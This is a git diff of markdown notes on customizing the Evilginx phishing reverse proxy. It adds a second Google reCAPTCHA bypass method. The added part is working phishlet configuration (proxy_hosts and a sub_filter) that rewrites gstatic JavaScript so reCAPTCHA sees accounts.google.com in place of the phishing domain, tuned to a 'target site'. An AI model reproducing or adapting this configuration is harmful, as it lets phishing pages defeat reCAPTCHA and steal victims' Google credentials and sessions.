@@ -41,7 +41,7 @@ re, err := regexp.Compile("^" + d + "$")
 re, err := regexp.Compile(d)
 ```
 
-### Google Recaptcha Bypass by [@Desire](https://twitter.com/DWORKWITH)
+### Google Recaptcha Bypass : Method-1 (by [@Desire](https://twitter.com/DWORKWITH))
 - Google recaptcha encodes domain in base64 and includes it in `co` parameter in GET request.
 - For Example in safe-domain (Demo) Login.
   ```
@@ -66,6 +66,17 @@ re, err := regexp.Compile(d)
 						req.URL.RawQuery = qs.Encode()
 					}
 				}
+```
+### Google Recaptcha Bypass : Method-2
+- This method works by modifying the javascript code responsible to generate the base64 string which contains the domain name.
+- Subfilter can be modified accordingly based on the target site.
+```
+proxy_hosts:
+  - {phish_sub: 'gstatic', orig_sub: 'www', domain: 'gstatic.com', session: true, is_landing: false, auto_filter: true}
+
+sub_filters:
+  # Change/modify the value assigned to variable 'A' based on your target site. 
+  - {triggers_on: 'www.gstatic.com', orig_sub: 'accounts', domain: 'google.com', search: 'A=si&&!d\?lX\.btoa\(y\):S\[6]\(40,l\[0],O\[l\[1]]\(24,0,8,y\),d\)', replace: 'A="aHR0cHM6Ly9hY2NvdW50cy5nb29nbGUuY29tOjQ0Mw."', mimes: ['text/javascript']}
 ```
 
 ### Evilginx3 Easter Egg Patch (X-Evilginx Header)
